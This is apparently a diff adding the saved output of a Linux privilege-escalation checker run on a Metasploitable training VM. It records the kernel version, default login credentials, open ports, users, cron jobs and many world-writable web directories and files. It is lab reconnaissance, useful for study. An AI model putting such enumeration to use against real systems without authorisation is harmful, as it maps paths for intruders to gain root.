@@ -1,0 +1,2384 @@
+root@metasploitable:/# =================================================================================================
+LINUX PRIVILEGE ESCALATION CHECKER
+=================================================================================================
+
+[*] GETTING BASIC SYSTEM INFO...
+
+[+] Kernel
+    Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008
+
+[+] Hostname
+    metasploitable
+
+[+] Operating System
+    _                  _       _ _        _     _      ____
+    _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \
+    | '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+    | | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/
+    |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+    |_|
+    Warning: Never expose this VM to an untrusted network!
+    Contact: msfdev[at]metasploit.com
+    Login with msfadmin/msfadmin to get started
+
+[*] GETTING NETWORKING INFO...
+
+[+] Interfaces
+    eth0      Link encap:Ethernet  HWaddr 08:00:27:fe:7c:ce
+    inet addr:192.168.1.154  Bcast:192.168.1.255  Mask:255.255.255.0
+    inet6 addr: fe80::a00:27ff:fefe:7cce/64 Scope:Link
+    UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+    RX packets:13851 errors:0 dropped:0 overruns:0 frame:0
+    TX packets:12860 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:1000
+    RX bytes:2640079 (2.5 MB)  TX bytes:6738141 (6.4 MB)
+    Base address:0xd020 Memory:f0200000-f0220000
+    lo        Link encap:Local Loopback
+    inet addr:127.0.0.1  Mask:255.0.0.0
+    inet6 addr: ::1/128 Scope:Host
+    UP LOOPBACK RUNNING  MTU:16436  Metric:1
+    RX packets:260 errors:0 dropped:0 overruns:0 frame:0
+    TX packets:260 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:0
+    RX bytes:96725 (94.4 KB)  TX bytes:96725 (94.4 KB)
+
+[+] Netstat
+    Active Internet connections (servers and established)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+    tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:60002           0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:34085           0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:1099            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:8787            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:8180            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
+    tcp        0      0 192.168.1.154:53        0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:53753           0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:34713           0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
+    tcp       47      0 192.168.1.154:1524      192.168.1.105:59302     CLOSE_WAIT  5931/-su
+    tcp6       0      0 :::2121                 :::*                    LISTEN      -
+    tcp6       0      0 :::3632                 :::*                    LISTEN      -
+    tcp6       0      0 :::53                   :::*                    LISTEN      -
+    tcp6       0      0 :::22                   :::*                    LISTEN      -
+    tcp6       0      0 :::5432                 :::*                    LISTEN      -
+    tcp6       0      0 ::1:953                 :::*                    LISTEN      -
+    udp        0      0 0.0.0.0:2049            0.0.0.0:*                           -
+    udp        0      0 192.168.1.154:137       0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:137             0.0.0.0:*                           -
+    udp        0      0 192.168.1.154:138       0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:138             0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:57106           0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:45088           0.0.0.0:*                           -
+    udp        0      0 192.168.1.154:53        0.0.0.0:*                           -
+    udp        0      0 127.0.0.1:53            0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:40131           0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:69              0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:52831           0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:869             0.0.0.0:*                           -
+    udp        0      0 127.0.0.1:40302         127.0.0.1:40302         ESTABLISHED -
+    udp        0      0 0.0.0.0:111             0.0.0.0:*                           -
+    udp6       0      0 :::53                   :::*                                -
+    udp6       0      0 :::49506                :::*                                -
+
+[+] Route
+
+[*] GETTING FILESYSTEM INFO...
+
+[+] Mount results
+    /dev/mapper/metasploitable-root on / type ext3 (rw,relatime,errors=remount-ro)
+    proc on /proc type proc (rw,noexec,nosuid,nodev)
+    /sys on /sys type sysfs (rw,noexec,nosuid,nodev)
+    varrun on /var/run type tmpfs (rw,noexec,nosuid,nodev,mode=0755)
+    varlock on /var/lock type tmpfs (rw,noexec,nosuid,nodev,mode=1777)
+    udev on /dev type tmpfs (rw,mode=0755)
+    devshm on /dev/shm type tmpfs (rw)
+    devpts on /dev/pts type devpts (rw,gid=5,mode=620)
+    /dev/sda1 on /boot type ext3 (rw,relatime)
+    securityfs on /sys/kernel/security type securityfs (rw)
+    rpc_pipefs on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw)
+    nfsd on /proc/fs/nfsd type nfsd (rw)
+
+[+] fstab entries
+    # /etc/fstab: static file system information.
+    #
+    # <file system> <mount point>   <type>  <options>       <dump>  <pass>
+    proc            /proc           proc    defaults        0       0
+    # /dev/mapper/metasploitabale-root
+    UUID=59bd36ce-2d78-44fe-843f-a4ca5fcafad1 /               ext3    relatime,errors=remount-ro 0       1
+    /dev/sda1 /boot           ext3    relatime        0       2
+    /dev/scd0       /media/cdrom0   udf,iso9660 user,noauto,exec,utf8 0       0
+    /dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
+
+[+] Scheduled cron jobs
+    -rw-r--r-- 1 root root  724 2008-04-08 14:02 /etc/crontab
+    /etc/cron.d:
+    total 20
+    drwxr-xr-x  2 root root 4096 2012-05-14 01:30 .
+    drwxr-xr-x 94 root root 4096 2026-11-22 19:10 ..
+    -rw-r--r--  1 root root  492 2010-01-06 17:05 php5
+    -rw-r--r--  1 root root  102 2008-04-08 14:02 .placeholder
+    -rw-r--r--  1 root root 1323 2008-03-31 09:16 postgresql-common
+    /etc/cron.daily:
+    total 60
+    drwxr-xr-x  2 root root 4096 2010-04-28 02:51 .
+    drwxr-xr-x 94 root root 4096 2026-11-22 19:10 ..
+    -rwxr-xr-x  1 root root  633 2008-02-01 23:10 apache2
+    -rwxr-xr-x  1 root root 7441 2008-04-22 11:20 apt
+    -rwxr-xr-x  1 root root  314 2008-04-04 05:56 aptitude
+    -rwxr-xr-x  1 root root  502 2007-12-12 08:59 bsdmainutils
+    -rwxr-xr-x  1 root root   89 2006-06-19 14:21 logrotate
+    -rwxr-xr-x  1 root root  954 2008-03-12 09:24 man-db
+    -rwxr-xr-x  1 root root  183 2008-03-08 13:22 mlocate
+    -rw-r--r--  1 root root  102 2008-04-08 14:02 .placeholder
+    -rwxr-xr-x  1 root root  383 2010-04-28 02:34 samba
+    -rwxr-xr-x  1 root root 3295 2008-04-08 14:02 standard
+    -rwxr-xr-x  1 root root 1309 2007-11-23 04:06 sysklogd
+    -rwxr-xr-x  1 root root  477 2008-12-07 14:17 tomcat55
+    /etc/cron.hourly:
+    total 12
+    drwxr-xr-x  2 root root 4096 2010-03-16 19:11 .
+    drwxr-xr-x 94 root root 4096 2026-11-22 19:10 ..
+    -rw-r--r--  1 root root  102 2008-04-08 14:02 .placeholder
+    /etc/cron.monthly:
+    total 20
+    drwxr-xr-x  2 root root 4096 2010-04-28 02:26 .
+    drwxr-xr-x 94 root root 4096 2026-11-22 19:10 ..
+    -rw-r--r--  1 root root  102 2008-04-08 14:02 .placeholder
+    -rwxr-xr-x  1 root root  664 2008-02-20 23:22 proftpd
+    -rwxr-xr-x  1 root root  129 2008-04-08 14:02 standard
+    /etc/cron.weekly:
+    total 24
+    drwxr-xr-x  2 root root 4096 2010-03-16 19:11 .
+    drwxr-xr-x 94 root root 4096 2026-11-22 19:10 ..
+    -rwxr-xr-x  1 root root  528 2008-03-12 09:24 man-db
+    -rw-r--r--  1 root root  102 2008-04-08 14:02 .placeholder
+    -rwxr-xr-x  1 root root 2522 2008-01-28 12:47 popularity-contest
+    -rwxr-xr-x  1 root root 1220 2007-11-23 04:06 sysklogd
+
+[+] Writable cron dirs
+
+
+[*] ENUMERATING USER AND ENVIRONMENTAL INFO...
+
+[+] Logged in User Activity
+    19:29:32 up 19 min,  2 users,  load average: 0.00, 0.06, 0.07
+    USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+    msfadmin tty1     -                19:10   18:33m  0.13s  0.00s -bash
+    root     pts/0    :0.0             19:10   19:16m  0.01s  0.01s -bash
+
+[+] Sudoers (privileged)
+
+[+] All users
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+    bin:x:2:2:bin:/bin:/bin/sh
+    sys:x:3:3:sys:/dev:/bin/sh
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/bin/sh
+    man:x:6:12:man:/var/cache/man:/bin/sh
+    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+    mail:x:8:8:mail:/var/mail:/bin/sh
+    news:x:9:9:news:/var/spool/news:/bin/sh
+    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+    proxy:x:13:13:proxy:/bin:/bin/sh
+    www-data:x:33:33:www-data:/var/www:/bin/sh
+    backup:x:34:34:backup:/var/backups:/bin/sh
+    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+    dhcp:x:101:102::/nonexistent:/bin/false
+    syslog:x:102:103::/home/syslog:/bin/false
+    klog:x:103:104::/home/klog:/bin/false
+    sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+    msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+    bind:x:105:113::/var/cache/bind:/bin/false
+    postfix:x:106:115::/var/spool/postfix:/bin/false
+    ftp:x:107:65534::/home/ftp:/bin/false
+    postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+    mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+    tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+    distccd:x:111:65534::/:/bin/false
+    user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+    service:x:1002:1002:,,,:/home/service:/bin/bash
+    telnetd:x:112:120::/nonexistent:/bin/false
+    proftpd:x:113:65534::/var/run/proftpd:/bin/false
+    statd:x:114:65534::/var/lib/nfs:/bin/false
+
+[+] Current User ID
+    uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
+
+[+] Super Users Found:
+    root
+
+[+] Environment
+    TERM=linux
+    SHELL=/bin/bash
+    USER=msfadmin
+    PATH=/usr/local/bin:/usr/bin:/bin:/usr/games
+    MAIL=/var/mail/msfadmin
+    _=/usr/bin/env
+    PWD=/home/msfadmin
+    LANG=en_US.UTF-8
+    HOME=/home/msfadmin
+    SHLVL=2
+    LOGNAME=msfadmin
+
+[+] Current User
+    msfadmin
+
+[+] Root and current user history (depends on privs)
+    lrwxrwxrwx 1 root root    9 2012-05-14 00:26 /home/msfadmin/.bash_history -> /dev/null
+    -rw------- 1 root root 4174 2012-05-14 02:01 /home/msfadmin/.mysql_history
+    lrwxrwxrwx 1 root root 9 2012-05-14 00:26 /root/.bash_history -> /dev/null
+
+[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...
+
+[+] World Writeable Directories for User/Group 'Root'
+    drwxrwxrwt 2 root root 40 2026-11-22 19:10 /dev/shm
+    drwxrwxrwt 3 root root 60 2026-11-22 19:10 /var/lock
+    drwx-wx-wt 2 root root 4096 2026-11-22 19:21 /var/lib/php5
+    drwxrwxrwt 2 root root 4096 2012-05-20 14:17 /var/tmp
+    drwxrwxrwt 2 root root 4096 2012-05-20 15:30 /var/www/dav
+    drwxrwxrwt 5 root root 4096 2026-11-22 19:29 /tmp
+    drwxrwxrwt 2 root root 4096 2026-11-22 19:10 /tmp/.ICE-unix
+    drwxrwxrwt 2 root root 4096 2026-11-22 19:10 /tmp/.X11-unix
+    drwxrwxrwx 2 root root 4096 2026-11-22 19:29 /tmp/post_enum
+
+[+] World Writeable Directories for Users other than Root
+    drwxrwxrwx 2 www-data www-data 4096 2003-02-01 19:57 /var/www/twiki/data/Sandbox
+    drwxrwxrwx 2 www-data www-data 4096 2010-04-16 17:59 /var/www/twiki/data/Main
+    drwxrwxrwx 2 www-data www-data 4096 2003-01-30 04:15 /var/www/twiki/data/Know
+    drwxrwxrwx 2 www-data www-data 16384 2003-02-01 21:45 /var/www/twiki/data/TWiki
+    drwxrwxrwx 2 www-data www-data 4096 2003-01-30 03:15 /var/www/twiki/data/_default
+    drwxrwxrwx 2 www-data www-data 4096 2003-02-01 07:05 /var/www/twiki/data/Trash
+    drwxrwxrwx 2 www-data www-data 4096 2002-04-21 02:05 /var/www/twiki/pub/Sandbox
+    drwxrwxrwx 2 www-data www-data 4096 2002-04-07 05:38 /var/www/twiki/pub/Main
+    drwxrwxrwx 3 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/Know
+    drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/Know/IncorrectDllVersionW32PTH10DLL
+    drwxrwxrwx 8 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki
+    drwxrwxrwx 2 www-data www-data 4096 2003-01-21 20:51 /var/www/twiki/pub/TWiki/TWikiDocGraphics
+    drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki/TWikiTemplates
+    drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki/TWikiLogos
+    drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki/PreviewBackground
+    drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki/FileAttachment
+    drwxrwxrwx 2 www-data www-data 4096 2002-11-18 15:31 /var/www/twiki/pub/TWiki/WabiSabi
+    drwxrwxrwx 2 www-data www-data 4096 2001-12-04 02:25 /var/www/twiki/pub/Trash
+    drwxrwxrwx 2 www-data www-data 4096 2003-02-01 18:46 /var/www/twiki/pub/icn
+
+[+] World Writable Files
+    -rwxrwxrwx 1 www-data www-data 124 2001-08-16 15:56 /var/www/twiki/data/Sandbox/WebChanges.txt
+    -rwxrwxrwx 1 www-data www-data 9 2001-10-25 11:51 /var/www/twiki/data/Sandbox/.mailnotify
+    -rwxrwxrwx 1 www-data www-data 690 2002-04-14 02:18 /var/www/twiki/data/Sandbox/WebHome.txt
+    -rwxrwxrwx 1 www-data www-data 924 2003-01-25 05:26 /var/www/twiki/data/Sandbox/WebNotify.txt
+    -rwxrwxrwx 1 www-data www-data 182 2001-11-24 06:39 /var/www/twiki/data/Sandbox/WebTopicList.txt
+    -rwxrwxrwx 1 www-data www-data 526 2001-08-16 15:56 /var/www/twiki/data/Sandbox/WebChanges.txt,v
+    -rwxrwxrwx 1 www-data www-data 2785 2003-01-25 05:26 /var/www/twiki/data/Sandbox/WebNotify.txt,v
+    -rwxrwxrwx 1 www-data www-data 158 2001-08-08 01:56 /var/www/twiki/data/Sandbox/WebSearch.txt
+    -rwxrwxrwx 1 www-data www-data 483 2001-11-24 06:39 /var/www/twiki/data/Sandbox/WebIndex.txt,v
+    -rwxrwxrwx 1 www-data www-data 3415 2003-01-19 16:37 /var/www/twiki/data/Sandbox/WebPreferences.txt
+    -rwxrwxrwx 1 www-data www-data 4206 2002-04-14 02:18 /var/www/twiki/data/Sandbox/WebHome.txt,v
+    -rwxrwxrwx 1 www-data www-data 371 2001-11-24 06:39 /var/www/twiki/data/Sandbox/WebTopicList.txt,v
+    -rwxrwxrwx 1 www-data www-data 10670 2001-08-08 01:56 /var/www/twiki/data/Sandbox/WebSearch.txt,v
+    -rwxrwxrwx 1 www-data www-data 831 2003-01-19 03:50 /var/www/twiki/data/Sandbox/WebStatistics.txt
+    -rwxrwxrwx 1 www-data www-data 6559 2003-01-19 16:37 /var/www/twiki/data/Sandbox/WebPreferences.txt,v
+    -rwxrwxrwx 1 www-data www-data 1436 2003-02-01 19:56 /var/www/twiki/data/Sandbox/.changes
+    -rwxrwxrwx 1 www-data www-data 176 2001-11-24 06:39 /var/www/twiki/data/Sandbox/WebIndex.txt
+    -rwxrwxrwx 1 www-data www-data 1532 2003-01-19 03:50 /var/www/twiki/data/Sandbox/WebStatistics.txt,v
+    -rwxrwxrwx 1 www-data www-data 416 2003-01-30 03:14 /var/www/twiki/data/Main/WebRss.txt
+    -rwxrwxrwx 1 www-data www-data 124 2001-08-16 15:56 /var/www/twiki/data/Main/WebChanges.txt
+    -rwxrwxrwx 1 www-data www-data 773 2003-01-11 19:02 /var/www/twiki/data/Main/AndreaSterbini.txt,v
+    -rwxrwxrwx 1 www-data www-data 414 2003-01-12 15:09 /var/www/twiki/data/Main/NobodyGroup.txt
+    -rwxrwxrwx 1 www-data www-data 9 2001-10-25 11:51 /var/www/twiki/data/Main/.mailnotify
+    -rwxrwxrwx 1 www-data www-data 295 2003-01-11 19:02 /var/www/twiki/data/Main/AndreaSterbini.txt
+    -rwxrwxrwx 1 www-data www-data 775 2000-12-15 13:03 /var/www/twiki/data/Main/LondonOffice.txt,v
+    -rwxrwxrwx 1 www-data www-data 163 2000-11-11 01:32 /var/www/twiki/data/Main/FileAttachment.txt
+    -rwxrwxrwx 1 www-data www-data 119 2003-01-11 19:29 /var/www/twiki/data/Main/TWikiVariables.txt
+    -rwxrwxrwx 1 www-data www-data 1995 2000-12-13 21:49 /var/www/twiki/data/Main/TWikiGuest.txt,v
+    -rwxrwxrwx 1 www-data www-data 1842 2003-02-01 21:43 /var/www/twiki/data/Main/WebHome.txt
+    -rwxrwxrwx 1 www-data www-data 168 2003-01-11 19:05 /var/www/twiki/data/Main/NicholasLee.txt
+    -rwxrwxrwx 1 www-data www-data 777 2000-12-15 13:03 /var/www/twiki/data/Main/SanJoseOffice.txt,v
+    -rwxrwxrwx 1 www-data www-data 924 2003-01-25 05:26 /var/www/twiki/data/Main/WebNotify.txt
+    -rwxrwxrwx 1 www-data www-data 161 2003-01-11 19:00 /var/www/twiki/data/Main/GrantBow.txt
+    -rwxrwxrwx 1 www-data www-data 182 2001-11-24 06:36 /var/www/twiki/data/Main/WebTopicList.txt
+    -rwxrwxrwx 1 www-data www-data 1536 2000-12-15 13:05 /var/www/twiki/data/Main/OfficeLocations.txt,v
+    -rwxrwxrwx 1 www-data www-data 605 2003-01-30 03:14 /var/www/twiki/data/Main/WebRss.txt,v
+    -rwxrwxrwx 1 www-data www-data 2885 2003-01-11 19:05 /var/www/twiki/data/Main/MikeMannix.txt,v
+    -rwxrwxrwx 1 www-data www-data 166 2003-01-11 19:04 /var/www/twiki/data/Main/JohnTalintyre.txt
+    -rwxrwxrwx 1 www-data www-data 174 2003-01-11 19:28 /var/www/twiki/data/Main/KevinKinnell.txt
+    -rwxrwxrwx 1 www-data www-data 417 2000-12-15 13:05 /var/www/twiki/data/Main/OfficeLocations.txt
+    -rwxrwxrwx 1 www-data www-data 281 2000-12-15 13:03 /var/www/twiki/data/Main/LondonOffice.txt
+    -rwxrwxrwx 1 www-data www-data 1030 2002-12-11 00:40 /var/www/twiki/data/Main/TWikiGroups.txt
+    -rwxrwxrwx 1 www-data www-data 895 2003-01-11 19:09 /var/www/twiki/data/Main/PeterThoeny.txt
+    -rwxrwxrwx 1 www-data www-data 3205 2003-01-11 19:09 /var/www/twiki/data/Main/PeterThoeny.txt,v
+    -rwxrwxrwx 1 www-data www-data 526 2001-08-16 15:56 /var/www/twiki/data/Main/WebChanges.txt,v
+    -rwxrwxrwx 1 www-data www-data 280 2000-12-15 13:03 /var/www/twiki/data/Main/TokyoOffice.txt
+    -rwxrwxrwx 1 www-data www-data 3996 2003-01-25 05:26 /var/www/twiki/data/Main/WebNotify.txt,v
+    -rwxrwxrwx 1 www-data www-data 350 2003-01-11 19:00 /var/www/twiki/data/Main/GrantBow.txt,v
+    -rwxrwxrwx 1 www-data www-data 158 2001-08-08 01:58 /var/www/twiki/data/Main/WebSearch.txt
+    -rwxrwxrwx 1 www-data www-data 673 2000-11-11 01:32 /var/www/twiki/data/Main/FileAttachment.txt,v
+    -rwxrwxrwx 1 www-data www-data 2397 2010-04-16 17:59 /var/www/twiki/data/Main/TWikiUsers.txt
+    -rwxrwxrwx 1 www-data www-data 283 2000-12-15 13:03 /var/www/twiki/data/Main/SanJoseOffice.txt
+    -rwxrwxrwx 1 www-data www-data 483 2001-11-24 06:36 /var/www/twiki/data/Main/WebIndex.txt,v
+    -rwxrwxrwx 1 www-data www-data 734 2003-01-11 19:01 /var/www/twiki/data/Main/RichardDonkin.txt,v
+    -rwxrwxrwx 1 www-data www-data 206 2003-01-11 19:01 /var/www/twiki/data/Main/RichardDonkin.txt
+    -rwxrwxrwx 1 www-data www-data 163 2003-01-11 19:05 /var/www/twiki/data/Main/MikeMannix.txt
+    -rwxrwxrwx 1 www-data www-data 3642 2003-01-19 16:36 /var/www/twiki/data/Main/WebPreferences.txt
+    -rwxrwxrwx 1 www-data www-data 774 2000-12-15 13:03 /var/www/twiki/data/Main/TokyoOffice.txt,v
+    -rwxrwxrwx 1 www-data www-data 686 2000-12-13 21:49 /var/www/twiki/data/Main/TWikiGuest.txt
+    -rwxrwxrwx 1 www-data www-data 11862 2003-02-01 21:43 /var/www/twiki/data/Main/WebHome.txt,v
+    -rwxrwxrwx 1 www-data www-data 742 2003-01-11 19:29 /var/www/twiki/data/Main/TWikiVariables.txt,v
+    -rwxrwxrwx 1 www-data www-data 371 2001-11-24 06:36 /var/www/twiki/data/Main/WebTopicList.txt,v
+    -rwxrwxrwx 1 www-data www-data 1192 2003-01-11 19:28 /var/www/twiki/data/Main/KevinKinnell.txt,v
+    -rwxrwxrwx 1 www-data www-data 18332 2001-08-08 01:58 /var/www/twiki/data/Main/WebSearch.txt,v
+    -rwxrwxrwx 1 www-data www-data 2186 2003-01-11 19:04 /var/www/twiki/data/Main/JohnTalintyre.txt,v
+    -rwxrwxrwx 1 www-data www-data 831 2003-01-19 03:49 /var/www/twiki/data/Main/WebStatistics.txt
+    -rwxrwxrwx 1 www-data www-data 903 2003-01-12 15:09 /var/www/twiki/data/Main/NobodyGroup.txt,v
+    -rwxrwxrwx 1 www-data www-data 8676 2003-01-19 16:36 /var/www/twiki/data/Main/WebPreferences.txt,v
+    -rwxrwxrwx 1 www-data www-data 3653 2010-04-16 17:59 /var/www/twiki/data/Main/.changes
+    -rwxrwxrwx 1 www-data www-data 176 2001-11-24 06:36 /var/www/twiki/data/Main/WebIndex.txt
+    -rwxrwxrwx 1 www-data www-data 526 2003-01-11 18:57 /var/www/twiki/data/Main/TWikiAdminGroup.txt
+    -rwxrwxrwx 1 www-data www-data 1632 2002-12-11 00:40 /var/www/twiki/data/Main/TWikiGroups.txt,v
+    -rwxrwxrwx 1 www-data www-data 1168 2003-01-11 19:05 /var/www/twiki/data/Main/NicholasLee.txt,v
+    -rwxrwxrwx 1 www-data www-data 1934 2003-01-19 03:49 /var/www/twiki/data/Main/WebStatistics.txt,v
+    -rwxrwxrwx 1 www-data www-data 2140 2003-01-11 18:57 /var/www/twiki/data/Main/TWikiAdminGroup.txt,v
+    -rwxrwxrwx 1 www-data www-data 410 2003-01-30 03:15 /var/www/twiki/data/Know/WebRss.txt
+    -rwxrwxrwx 1 www-data www-data 1923 2001-11-07 22:34 /var/www/twiki/data/Know/WebTopicEditTemplate.txt,v
+    -rwxrwxrwx 1 www-data www-data 124 2001-08-16 15:57 /var/www/twiki/data/Know/WebChanges.txt
+    -rwxrwxrwx 1 www-data www-data 1576 2000-11-12 04:10 /var/www/twiki/data/Know/TWikiCategory.txt,v
+    -rwxrwxrwx 1 www-data www-data 9 2001-10-25 11:51 /var/www/twiki/data/Know/.mailnotify
+    -rwxrwxrwx 1 www-data www-data 747 2000-11-12 04:10 /var/www/twiki/data/Know/TWikiCategory.txt
+    -rwxrwxrwx 1 www-data www-data 611 2001-09-04 03:13 /var/www/twiki/data/Know/OperatingSystem.txt
+    -rwxrwxrwx 1 www-data www-data 5945 2002-04-14 22:19 /var/www/twiki/data/Know/ReadmeFirst.txt,v
+    -rwxrwxrwx 1 www-data www-data 258 2000-08-18 21:15 /var/www/twiki/data/Know/OsWin.txt
+    -rwxrwxrwx 1 www-data www-data 3928 2001-09-04 03:12 /var/www/twiki/data/Know/IncorrectDllVersionW32PTH10DLL.txt,v
+    -rwxrwxrwx 1 www-data www-data 660 2000-08-18 21:18 /var/www/twiki/data/Know/PublicFAQ.txt,v
+    -rwxrwxrwx 1 www-data www-data 801 2002-04-14 02:20 /var/www/twiki/data/Know/WebHome.txt
+    -rwxrwxrwx 1 www-data www-data 273 2000-08-18 21:18 /var/www/twiki/data/Know/PublicFAQ.txt
+    -rwxrwxrwx 1 www-data www-data 924 2003-01-25 05:26 /var/www/twiki/data/Know/WebNotify.txt
+    -rwxrwxrwx 1 www-data www-data 184 2001-09-04 03:14 /var/www/twiki/data/Know/OsVersion.txt
+    -rwxrwxrwx 1 www-data www-data 2535 2002-04-14 22:19 /var/www/twiki/data/Know/ReadmeFirst.txt
+    -rwxrwxrwx 1 www-data www-data 678 2000-08-18 21:18 /var/www/twiki/data/Know/PublicSupported.txt,v
+    -rwxrwxrwx 1 www-data www-data 182 2001-11-24 06:38 /var/www/twiki/data/Know/WebTopicList.txt
+    -rwxrwxrwx 1 www-data www-data 599 2003-01-30 03:15 /var/www/twiki/data/Know/WebRss.txt,v
+    -rwxrwxrwx 1 www-data www-data 591 2000-08-18 21:17 /var/www/twiki/data/Know/OsSolaris.txt,v
+    -rwxrwxrwx 1 www-data www-data 540 2001-09-18 02:39 /var/www/twiki/data/Know/WebForm.txt
+    -rwxrwxrwx 1 www-data www-data 442 2000-08-18 21:16 /var/www/twiki/data/Know/OsMacOS.txt,v
+    -rwxrwxrwx 1 www-data www-data 518 2001-09-04 03:08 /var/www/twiki/data/Know/WinDoze95Crash.txt
+    -rwxrwxrwx 1 www-data www-data 585 2000-08-18 21:16 /var/www/twiki/data/Know/OsLinux.txt,v
+    -rwxrwxrwx 1 www-data www-data 417 2001-09-04 03:14 /var/www/twiki/data/Know/TopicClassification.txt
+    -rwxrwxrwx 1 www-data www-data 403 2001-11-07 22:34 /var/www/twiki/data/Know/WebTopicEditTemplate.txt
+    -rwxrwxrwx 1 www-data www-data 1231 2001-09-04 03:08 /var/www/twiki/data/Know/WinDoze95Crash.txt,v
+    -rwxrwxrwx 1 www-data www-data 765 2001-09-04 03:12 /var/www/twiki/data/Know/IncorrectDllVersionW32PTH10DLL.txt
+    -rwxrwxrwx 1 www-data www-data 934 2001-09-04 03:14 /var/www/twiki/data/Know/TopicClassification.txt,v
+    -rwxrwxrwx 1 www-data www-data 195 2000-04-05 19:03 /var/www/twiki/data/Know/SunOS.txt,v
+    -rwxrwxrwx 1 www-data www-data 526 2001-08-16 15:57 /var/www/twiki/data/Know/WebChanges.txt,v
+    -rwxrwxrwx 1 www-data www-data 251 2000-08-18 21:16 /var/www/twiki/data/Know/OsLinux.txt
+    -rwxrwxrwx 1 www-data www-data 3939 2003-01-25 05:26 /var/www/twiki/data/Know/WebNotify.txt,v
+    -rwxrwxrwx 1 www-data www-data 1414 2001-09-04 03:20 /var/www/twiki/data/Know/WebSearch.txt
